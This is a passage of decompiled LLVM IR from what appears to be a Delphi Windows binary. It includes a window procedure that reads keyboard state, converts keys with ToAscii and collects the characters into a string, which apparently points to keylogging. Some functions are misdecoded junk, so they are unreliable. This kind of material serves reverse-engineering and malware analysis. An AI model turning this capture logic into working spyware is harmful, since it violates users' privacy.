  %80 = inttoptr i32 %79 to i32*, !insn.addr !914
  store i32 %78, i32* %80, align 4, !insn.addr !914
  %81 = call i32 @"@LStrCatN"(), !insn.addr !915
  %82 = add i32 %esp.0.reload, -56, !insn.addr !916
  %83 = inttoptr i32 %82 to i32*, !insn.addr !916
  %84 = add i32 %esp.0.reload, -60, !insn.addr !917
  %85 = inttoptr i32 %84 to i32*, !insn.addr !917
  store i32 4217356, i32* %85, align 4, !insn.addr !917
  %86 = load i32, i32* %stack_var_-4, align 4, !insn.addr !918
  %87 = add i32 %esp.0.reload, -64, !insn.addr !918
  %88 = inttoptr i32 %87 to i32*, !insn.addr !918
  store i32 %86, i32* %88, align 4, !insn.addr !918
  %89 = add i32 %esp.0.reload, -68, !insn.addr !919
  %90 = inttoptr i32 %89 to i32*, !insn.addr !919
  store i32 4217372, i32* %90, align 4, !insn.addr !919
  %91 = load i32, i32* %stack_var_-8, align 4, !insn.addr !920
  %92 = add i32 %esp.0.reload, -72, !insn.addr !920
  %93 = inttoptr i32 %92 to i32*, !insn.addr !920
  store i32 %91, i32* %93, align 4, !insn.addr !920
  %94 = add i32 %esp.0.reload, -76, !insn.addr !921
  %95 = inttoptr i32 %94 to i32*, !insn.addr !921
  store i32 4217388, i32* %95, align 4, !insn.addr !921
  %96 = call i32 @function_407444(), !insn.addr !922
  %97 = add i32 %esp.0.reload, -80, !insn.addr !923
  %98 = inttoptr i32 %97 to i32*, !insn.addr !923
  %99 = call i32 @"@LStrCatN"(), !insn.addr !924
  %100 = add i32 %esp.0.reload, -84, !insn.addr !925
  %101 = inttoptr i32 %100 to i32*
  %102 = call i32 @"@LStrFromPChar"(), !insn.addr !926
  %103 = call i32 @function_405574(), !insn.addr !927
  %104 = add i32 %esp.0.reload, -88, !insn.addr !928
  %105 = inttoptr i32 %104 to i32*, !insn.addr !928
  %106 = call i32 @"@LStrFromPChar"(), !insn.addr !929
  %107 = call i32 @function_405574(), !insn.addr !930
  %108 = add i32 %esp.0.reload, -92, !insn.addr !931
  %109 = inttoptr i32 %108 to i32*, !insn.addr !931
  %110 = call i32 @"@LStrFromPChar"(), !insn.addr !932
  %111 = call i32 @function_405574(), !insn.addr !933
  %112 = call i32 @function_4051cc(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !934
  store i32* %101, i32** %.pre-phi.reg2mem, !insn.addr !935
  store i32 %100, i32* %esp.1.reg2mem, !insn.addr !935
  br label %dec_label_pc_4059c2, !insn.addr !935

dec_label_pc_40594d:                              ; preds = %dec_label_pc_4057db
  %113 = call i32 @function_4034c8(), !insn.addr !936
  %114 = icmp slt i32 %113, 5, !insn.addr !937
  store i32* %58, i32** %.pre-phi.reg2mem, !insn.addr !937
  store i32 %57, i32* %esp.1.reg2mem, !insn.addr !937
  br i1 %114, label %dec_label_pc_4059c2, label %dec_label_pc_40595a, !insn.addr !937

dec_label_pc_40595a:                              ; preds = %dec_label_pc_40594d
  %115 = add i32 %esp.0.reload, -36, !insn.addr !938
  %116 = inttoptr i32 %115 to i32*, !insn.addr !938
  store i32 ptrtoint ([5 x i8]* @global_var_405a40 to i32), i32* %116, align 4, !insn.addr !938
  %117 = call i32 @function_404b64(), !insn.addr !939
  %118 = add i32 %esp.0.reload, -40, !insn.addr !940
  %119 = inttoptr i32 %118 to i32*, !insn.addr !940
  %120 = add i32 %esp.0.reload, -44, !insn.addr !941
  %121 = inttoptr i32 %120 to i32*, !insn.addr !941
  store i32 ptrtoint ([7 x i8]* @global_var_405a50 to i32), i32* %121, align 4, !insn.addr !941
  %122 = call i32 @function_404b64(), !insn.addr !942
  %123 = add i32 %esp.0.reload, -48, !insn.addr !943
  %124 = inttoptr i32 %123 to i32*
  %125 = call i32 @"@LStrCatN"(), !insn.addr !944
  %126 = add i32 %esp.0.reload, -52, !insn.addr !945
  %127 = inttoptr i32 %126 to i32*, !insn.addr !945
  %128 = call i32 @"@LStrFromPChar"(), !insn.addr !946
  %129 = call i32 @function_405574(), !insn.addr !947
  %130 = call i32 @function_404cbc(), !insn.addr !948
  store i32* %124, i32** %.pre-phi.reg2mem, !insn.addr !949
  store i32 %123, i32* %esp.1.reg2mem, !insn.addr !949
  br label %dec_label_pc_4059c2, !insn.addr !949

dec_label_pc_4059b7:                              ; preds = %dec_label_pc_4057db
  %131 = call i32 @function_4034c8(), !insn.addr !950
  store i32* %58, i32** %.pre-phi.reg2mem, !insn.addr !951
  store i32 %57, i32* %esp.1.reg2mem, !insn.addr !951
  br label %dec_label_pc_4059c2, !insn.addr !951

dec_label_pc_4059c2:                              ; preds = %dec_label_pc_4057db, %dec_label_pc_4059b7, %dec_label_pc_40595a, %dec_label_pc_40594d, %dec_label_pc_40585d, %dec_label_pc_40584c
  %132 = add i32 %esp.0.reload, -12, !insn.addr !952
  %133 = inttoptr i32 %132 to i32*, !insn.addr !952
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %134 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !953
  call void @__writefsdword(i32 0, i32 %134), !insn.addr !954
  %135 = add i32 %esp.1.reload, 8, !insn.addr !955
  %136 = inttoptr i32 %135 to i32*, !insn.addr !955
  store i32 4217316, i32* %136, align 4, !insn.addr !955
  %137 = call i32 @"@LStrArrayClr"(), !insn.addr !956
  ret i32 %137, !insn.addr !957
}

define i32 @function_4059dd() local_unnamed_addr {
dec_label_pc_4059dd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !958
  ret i32 %0, !insn.addr !958
}

define i32 @function_4059e2() local_unnamed_addr {
dec_label_pc_4059e2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !959
}

define i32 @function_4059e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4059e4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !960
}

define i32 @function_405a0f() local_unnamed_addr {
dec_label_pc_405a0f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !961
}

define i32 @function_405a17() local_unnamed_addr {
dec_label_pc_405a17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !962
  %2 = inttoptr i32 %0 to i32*, !insn.addr !962
  store i32 %1, i32* %2, align 4, !insn.addr !962
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !963
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !963
  %7 = add i8 %4, %6, !insn.addr !963
  %8 = inttoptr i32 %5 to i8*, !insn.addr !963
  store i8 %7, i8* %8, align 1, !insn.addr !963
  %9 = load i8, i8* %3, align 4, !insn.addr !964
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !964
  %12 = trunc i32 %11 to i8, !insn.addr !964
  %13 = add i8 %9, %12, !insn.addr !964
  %14 = inttoptr i32 %10 to i8*, !insn.addr !964
  store i8 %13, i8* %14, align 1, !insn.addr !964
  %15 = load i32, i32* %eax, align 4, !insn.addr !965
  ret i32 %15, !insn.addr !965
}

define i32 @function_405a1e() local_unnamed_addr {
dec_label_pc_405a1e:
  %0 = call i32 @function_405a5c(), !insn.addr !966
  ret i32 %0, !insn.addr !966
}

define i32 @function_405a4b() local_unnamed_addr {
dec_label_pc_405a4b:
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %2 = add i32 %0, 1, !insn.addr !967
  %3 = inttoptr i32 %0 to i32*, !insn.addr !967
  store i32 %2, i32* %3, align 4, !insn.addr !967
  %4 = bitcast i32* %eax to i8*
  %5 = load i8, i8* %4, align 4, !insn.addr !968
  %6 = load i32, i32* %eax, align 4
  %7 = trunc i32 %6 to i8, !insn.addr !968
  %8 = add i8 %5, %7, !insn.addr !968
  %9 = inttoptr i32 %6 to i8*, !insn.addr !968
  store i8 %8, i8* %9, align 1, !insn.addr !968
  %10 = bitcast i32* %esi to i8*
  %11 = load i8, i8* %10, align 4, !insn.addr !969
  %12 = load i32, i32* %eax, align 4, !insn.addr !969
  %13 = udiv i32 %12, 256, !insn.addr !969
  %14 = trunc i32 %13 to i8, !insn.addr !969
  %15 = add i8 %11, %14, !insn.addr !969
  %16 = load i32, i32* %esi, align 4, !insn.addr !969
  %17 = inttoptr i32 %16 to i8*, !insn.addr !969
  store i8 %15, i8* %17, align 1, !insn.addr !969
  %18 = trunc i32 %1 to i16, !insn.addr !970
  %19 = call i8 @__asm_in(i16 %18), !insn.addr !970
  %20 = sext i8 %19 to i32, !insn.addr !970
  %21 = load i32, i32* %eax, align 4, !insn.addr !970
  %22 = and i32 %21, -256, !insn.addr !970
  %23 = or i32 %22, %20, !insn.addr !970
  ret i32 %23, !insn.addr !971
}

define i32 @function_405a5c() local_unnamed_addr {
dec_label_pc_405a5c:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !972
  %.pre-phi.reg2mem = alloca i32, !insn.addr !972
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = add i32 %0, 12, !insn.addr !973
  %2 = inttoptr i32 %1 to i32*, !insn.addr !973
  %3 = load i32, i32* %2, align 4, !insn.addr !973
  %4 = icmp eq i32 %3, 74, !insn.addr !974
  %5 = icmp eq i1 %4, false, !insn.addr !975
  br i1 %5, label %dec_label_pc_405a5c.dec_label_pc_405ab9_crit_edge, label %dec_label_pc_405a65, !insn.addr !975

dec_label_pc_405a5c.dec_label_pc_405ab9_crit_edge: ; preds = %dec_label_pc_405a5c
  %.pre = add i32 %0, 20, !insn.addr !976
  store i32 %.pre, i32* %.pre-phi.reg2mem
  store i32* %stack_var_-4, i32** %esp.0.in.reg2mem
  br label %dec_label_pc_405ab9

dec_label_pc_405a65:                              ; preds = %dec_label_pc_405a5c
  %6 = call i32 @"@LStrSetLength"(), !insn.addr !977
  %7 = call i32 @function_403720(), !insn.addr !978
  %8 = call i32 @function_4045ac(), !insn.addr !979
  %9 = add i32 %0, 20
  %10 = inttoptr i32 %9 to %_SECURITY_ATTRIBUTES*, !insn.addr !980
  %11 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %10, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !981
  store i32 0, i32* %stack_var_-52, align 4, !insn.addr !982
  %12 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %10, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !983
  store i32 %9, i32* %.pre-phi.reg2mem, !insn.addr !983
  store i32* %stack_var_-52, i32** %esp.0.in.reg2mem, !insn.addr !983
  br label %dec_label_pc_405ab9, !insn.addr !983

dec_label_pc_405ab9:                              ; preds = %dec_label_pc_405a5c.dec_label_pc_405ab9_crit_edge, %dec_label_pc_405a65
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %13 = inttoptr i32 %.pre-phi.reload to i32*, !insn.addr !976
  %14 = load i32, i32* %13, align 4, !insn.addr !976
  %15 = add i32 %esp.0, -4, !insn.addr !984
  %16 = inttoptr i32 %15 to i32*, !insn.addr !984
  store i32 %14, i32* %16, align 4, !insn.addr !984
  %17 = add i32 %0, 16, !insn.addr !985
  %18 = inttoptr i32 %17 to i32*, !insn.addr !985
  %19 = load i32, i32* %18, align 4, !insn.addr !985
  %20 = add i32 %esp.0, -8, !insn.addr !986
  %21 = inttoptr i32 %20 to i32*, !insn.addr !986
  store i32 %19, i32* %21, align 4, !insn.addr !986
  %22 = add i32 %esp.0, -12, !insn.addr !987
  %23 = inttoptr i32 %22 to i32*, !insn.addr !987
  store i32 %3, i32* %23, align 4, !insn.addr !987
  %24 = add i32 %0, 8, !insn.addr !988
  %25 = inttoptr i32 %24 to i32*, !insn.addr !988
  %26 = load i32, i32* %25, align 4, !insn.addr !988
  %27 = add i32 %esp.0, -16, !insn.addr !989
  %28 = inttoptr i32 %27 to i32*, !insn.addr !989
  store i32 %26, i32* %28, align 4, !insn.addr !989
  %29 = call i32 @DefWindowProcA(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !990
  ret i32 %29, !insn.addr !991
}

define i32 @function_405ad4() local_unnamed_addr {
dec_label_pc_405ad4:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !992
  %3 = ptrtoint i32* %2 to i32, !insn.addr !992
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4217432 to i32*), i32 -4, i32 %3), !insn.addr !993
  ret i32 %4, !insn.addr !994
}

define i32 @function_405b09(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_405b09:
  %esp.0.reg2mem = alloca i32, !insn.addr !995
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg6, i32* %stack_var_4, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !995
  %7 = inttoptr i32 %4 to i8*, !insn.addr !995
  store i8 %6, i8* %7, align 1, !insn.addr !995
  %8 = add i32 %4, 114, !insn.addr !996
  %9 = inttoptr i32 %8 to i8*, !insn.addr !996
  %10 = load i8, i8* %9, align 1, !insn.addr !996
  %11 = udiv i32 %3, 256, !insn.addr !996
  %12 = trunc i32 %11 to i8, !insn.addr !996
  %13 = add i8 %10, %12, !insn.addr !996
  store i8 %13, i8* %9, align 1, !insn.addr !996
  %14 = add i8 %5, -32, !insn.addr !997
  %15 = icmp ult i8 %5, 32, !insn.addr !997
  %16 = icmp eq i8 %14, 0, !insn.addr !997
  %17 = zext i8 %14 to i32, !insn.addr !997
  %18 = and i32 %4, -256, !insn.addr !997
  %19 = or i32 %18, %17, !insn.addr !997
  %20 = or i1 %15, %16, !insn.addr !998
  br i1 %20, label %dec_label_pc_405b12, label %dec_label_pc_405b81, !insn.addr !998

dec_label_pc_405b12:                              ; preds = %dec_label_pc_405b09
  %21 = add i32 %19, 105, !insn.addr !999
  %22 = inttoptr i32 %21 to i8*, !insn.addr !999
  %23 = load i8, i8* %22, align 1, !insn.addr !999
  %24 = and i8 %23, %12, !insn.addr !999
  store i8 %24, i8* %22, align 1, !insn.addr !999
  %25 = load i32, i32* %stack_var_4, align 4, !insn.addr !1000
  %26 = trunc i32 %arg3 to i16, !insn.addr !1001
  %27 = inttoptr i32 %25 to i8*, !insn.addr !1001
  %28 = load i8, i8* %27, align 1, !insn.addr !1001
  call void @__asm_outsb(i16 %26, i8 %28), !insn.addr !1001
  %29 = add i32 %arg5, 105, !insn.addr !1002
  %30 = and i32 %29, 65535
  %31 = inttoptr i32 %30 to i8*, !insn.addr !1002
  %32 = load i8, i8* %31, align 1, !insn.addr !1002
  %33 = udiv i32 %arg2, 256, !insn.addr !1002
  %34 = trunc i32 %33 to i8, !insn.addr !1002
  %35 = and i8 %32, %34, !insn.addr !1002
  store i8 %35, i8* %31, align 1, !insn.addr !1002
  %36 = mul i32 %arg5, 2, !insn.addr !1003
  %37 = add i32 %arg2, 115, !insn.addr !1003
  %38 = add i32 %37, %36, !insn.addr !1003
  %39 = inttoptr i32 %38 to i8*, !insn.addr !1003
  %40 = load i8, i8* %39, align 1, !insn.addr !1003
  %41 = trunc i32 %arg2 to i8, !insn.addr !1003
  %42 = add i8 %40, %41, !insn.addr !1003
  %43 = icmp eq i8 %42, 0, !insn.addr !1003
  store i8 %42, i8* %39, align 1, !insn.addr !1003
  br i1 %43, label %dec_label_pc_405b63, label %dec_label_pc_405b21, !insn.addr !1004

dec_label_pc_405b21:                              ; preds = %dec_label_pc_405b12
  %44 = inttoptr i32 %25 to i32*, !insn.addr !1005
  %45 = load i32, i32* %44, align 4, !insn.addr !1005
  call void @__asm_outsd(i16 %26, i32 %45), !insn.addr !1005
  %46 = call i32 @__readfsdword(i32 0), !insn.addr !1006
  store i32 %46, i32* %stack_var_16, align 4, !insn.addr !1006
  %47 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1006
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !1007
  %48 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !1008
  %49 = add i32 %48, 1, !insn.addr !1008
  %50 = icmp eq i32 %49, 0, !insn.addr !1008
  store i32 %49, i32* @global_var_4096b0, align 4, !insn.addr !1008
  %51 = icmp eq i1 %50, false, !insn.addr !1009
  br i1 %51, label %dec_label_pc_405b47, label %dec_label_pc_405b3d, !insn.addr !1009

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b21
  %52 = call i32 @"@LStrClr"(), !insn.addr !1010
  br label %dec_label_pc_405b47, !insn.addr !1010

dec_label_pc_405b47:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b21
  %53 = load i32, i32* %stack_var_16, align 4, !insn.addr !1011
  call void @__writefsdword(i32 0, i32 %53), !insn.addr !1012
  ret i32 0, !insn.addr !1013

dec_label_pc_405b63:                              ; preds = %dec_label_pc_405b12
  %54 = add i32 %25, 1, !insn.addr !1014
  %55 = inttoptr i32 %arg2 to i8*, !insn.addr !1015
  %56 = load i8, i8* %55, align 1, !insn.addr !1015
  %57 = trunc i32 %54 to i8, !insn.addr !1015
  %58 = add i8 %56, %57, !insn.addr !1015
  store i8 %58, i8* %55, align 1, !insn.addr !1015
  ret i32 %54, !insn.addr !1016

dec_label_pc_405b81:                              ; preds = %dec_label_pc_405b09
  %59 = add i32 %2, 104, !insn.addr !1017
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1017
  store i8 0, i8* %60, align 1, !insn.addr !1017
  %61 = ptrtoint i32* %stack_var_4 to i32, !insn.addr !1018
  %62 = add i32 %19, 1, !insn.addr !1019
  %63 = mul i32 %0, 8, !insn.addr !1020
  %64 = add i32 %0, 48, !insn.addr !1020
  %65 = add i32 %64, %63, !insn.addr !1020
  %66 = inttoptr i32 %65 to i8*, !insn.addr !1020
  %67 = load i8, i8* %66, align 1, !insn.addr !1020
  %68 = udiv i32 %62, 256, !insn.addr !1020
  %69 = trunc i32 %68 to i8, !insn.addr !1020
  %70 = add i8 %67, %69, !insn.addr !1020
  store i8 %70, i8* %66, align 1, !insn.addr !1020
  call void @__writefsdword(i32 %62, i32 %61), !insn.addr !1021
  %71 = call i32 @function_407200(), !insn.addr !1022
  %72 = icmp ne i32 %71, 0, !insn.addr !1023
  %73 = icmp eq i1 %72, false, !insn.addr !1024
  store i32 %61, i32* %esp.0.reg2mem, !insn.addr !1025
  br i1 %73, label %dec_label_pc_405c63, label %dec_label_pc_405ba5, !insn.addr !1025

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b81
  switch i32 %1, label %dec_label_pc_405bef [
    i32 8, label %dec_label_pc_405bb3
    i32 46, label %dec_label_pc_405bd2
  ]

dec_label_pc_405bb3:                              ; preds = %dec_label_pc_405ba5
  %74 = call i32 @function_40729c(), !insn.addr !1026
  %75 = call i32 @"@LStrDelete"(), !insn.addr !1027
  store i32 %61, i32* %esp.0.reg2mem, !insn.addr !1028
  br label %dec_label_pc_405c63, !insn.addr !1028

dec_label_pc_405bd2:                              ; preds = %dec_label_pc_405ba5
  %76 = call i32 @function_40729c(), !insn.addr !1029
  %77 = call i32 @"@LStrDelete"(), !insn.addr !1030
  store i32 %61, i32* %esp.0.reg2mem, !insn.addr !1031
  br label %dec_label_pc_405c63, !insn.addr !1031

dec_label_pc_405bef:                              ; preds = %dec_label_pc_405ba5
  %78 = add i32 %2, -260, !insn.addr !1032
  %79 = inttoptr i32 %78 to i8*, !insn.addr !1033
  %80 = call i1 @GetKeyboardState(i8* %79), !insn.addr !1033
  %81 = add i32 %2, -4, !insn.addr !1034
  %82 = udiv i32 %0, 65536, !insn.addr !1035
  %83 = and i32 %82, 255, !insn.addr !1036
  %84 = inttoptr i32 %83 to i16*, !insn.addr !1037
  %85 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !1038
  %86 = call i32 @ToAscii(i32 0, i32 %81, i8* %79, i16* %84, i32 %1), !insn.addr !1039
  %87 = icmp eq i32 %86, 1, !insn.addr !1040
  %88 = icmp eq i1 %87, false, !insn.addr !1041
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !1041
  br i1 %88, label %dec_label_pc_405c63, label %dec_label_pc_405c1b, !insn.addr !1041

dec_label_pc_405c1b:                              ; preds = %dec_label_pc_405bef
  %89 = call i32 @function_406f64(), !insn.addr !1042
  %90 = icmp eq i32 %89, 0, !insn.addr !1043
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !1044
  br i1 %90, label %dec_label_pc_405c63, label %dec_label_pc_405c27, !insn.addr !1044

dec_label_pc_405c27:                              ; preds = %dec_label_pc_405c1b
  %91 = call i32 @function_4034c8(), !insn.addr !1045
  %92 = icmp sgt i32 %91, 15, !insn.addr !1046
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !1046
  br i1 %92, label %dec_label_pc_405c63, label %dec_label_pc_405c38, !insn.addr !1046

dec_label_pc_405c38:                              ; preds = %dec_label_pc_405c27
  %93 = call i32 @function_40729c(), !insn.addr !1047
  %94 = call i32 @"@LStrFromChar"(), !insn.addr !1048
  %95 = call i32 @"@LStrInsert"(), !insn.addr !1049
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !1049
  br label %dec_label_pc_405c63, !insn.addr !1049

dec_label_pc_405c63:                              ; preds = %dec_label_pc_405c38, %dec_label_pc_405c27, %dec_label_pc_405c1b, %dec_label_pc_405bef, %dec_label_pc_405bd2, %dec_label_pc_405bb3, %dec_label_pc_405b81
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %96 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1050
  %97 = load i32, i32* %96, align 4, !insn.addr !1050
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1051
  %98 = add i32 %esp.0.reload, 8, !insn.addr !1052
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1052
  store i32 4217987, i32* %99, align 4, !insn.addr !1052
  %100 = call i32 @"@LStrClr"(), !insn.addr !1053
  ret i32 %100, !insn.addr !1054
}

define i32 @function_405c7c() local_unnamed_addr {
dec_label_pc_405c7c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1055
  ret i32 %0, !insn.addr !1055
}

define i32 @function_405c81() local_unnamed_addr {
dec_label_pc_405c81:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1056
}

define i32 @function_405c83(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c83:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1057
}

define i32 @function_405c8c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c8c:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1058
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !1058
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1058
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1059
  %2 = call i32 @function_407200(), !insn.addr !1060
  %3 = icmp ne i32 %2, 0, !insn.addr !1061
  %4 = icmp eq i1 %3, false, !insn.addr !1062
  br i1 %4, label %dec_label_pc_405d30, label %dec_label_pc_405cb6, !insn.addr !1063

dec_label_pc_405cb6:                              ; preds = %dec_label_pc_405c8c
  %5 = call i32 @function_406798(), !insn.addr !1064
  br label %dec_label_pc_405d30

dec_label_pc_405d30:                              ; preds = %dec_label_pc_405cb6, %dec_label_pc_405c8c
  %6 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1065
  call void @__writefsdword(i32 0, i32 %6), !insn.addr !1066
  %7 = add i32 %1, 8, !insn.addr !1067
  %8 = inttoptr i32 %7 to i32*, !insn.addr !1067
  store i32 4218194, i32* %8, align 4, !insn.addr !1067
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !1068
  ret i32 %9, !insn.addr !1069
}

define i32 @function_405d4b() local_unnamed_addr {
dec_label_pc_405d4b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1070
  ret i32 %0, !insn.addr !1070
}

define i32 @function_405d50() local_unnamed_addr {
dec_label_pc_405d50:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1071
}

define i32 @function_405d52(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405d52:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1072
}

define i32 @function_405d58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405d58:
  %esp.0.reg2mem = alloca i32, !insn.addr !1073
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1074
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1074
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1074
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1075
  %3 = call i32 @function_407170(), !insn.addr !1076
  %4 = icmp eq i32 %3, 0, !insn.addr !1077
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1078
  br i1 %4, label %dec_label_pc_405dbc, label %dec_label_pc_405d79, !insn.addr !1078

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d58
  %5 = inttoptr i32 %0 to i8*, !insn.addr !1079
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405de0 to i32*), i8* null, i8* %5), !insn.addr !1080
  %7 = ptrtoint i32* %6 to i32, !insn.addr !1080
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !1081
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1081
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !1082
  %10 = icmp eq i1 %9, false, !insn.addr !1083
  br i1 %10, label %dec_label_pc_405db7, label %dec_label_pc_405d94, !insn.addr !1084

dec_label_pc_405d94:                              ; preds = %dec_label_pc_405d79
  %11 = call i32 @function_406fd0(), !insn.addr !1085
  %12 = call i32 @"@LStrAsg"(), !insn.addr !1086
  %13 = call i32 @function_4072f8(), !insn.addr !1087
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !1088
  br label %dec_label_pc_405dbc, !insn.addr !1088

dec_label_pc_405db7:                              ; preds = %dec_label_pc_405d79
  %14 = call i32 @function_40742c(), !insn.addr !1089
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !1089
  br label %dec_label_pc_405dbc, !insn.addr !1089

dec_label_pc_405dbc:                              ; preds = %dec_label_pc_405db7, %dec_label_pc_405d94, %dec_label_pc_405d58
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1090
  %16 = load i32, i32* %15, align 4, !insn.addr !1090
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !1091
  %17 = add i32 %esp.0.reload, 8, !insn.addr !1092
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1092
  store i32 4218329, i32* %18, align 4, !insn.addr !1092
  %19 = call i32 @"@LStrClr"(), !insn.addr !1093
  ret i32 %19, !insn.addr !1094
}

define i32 @function_405dd2() local_unnamed_addr {
dec_label_pc_405dd2:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1095
  ret i32 %0, !insn.addr !1095
}

define i32 @function_405dd7() local_unnamed_addr {
dec_label_pc_405dd7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1096
}

define i32 @function_405dd9(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405dd9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1097
}

define i32 @function_405ddd() local_unnamed_addr {
dec_label_pc_405ddd:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !1098
  %8 = inttoptr i32 %4 to i8*, !insn.addr !1098
  store i8 %7, i8* %8, align 1, !insn.addr !1098
  %9 = add i32 %2, 111, !insn.addr !1099
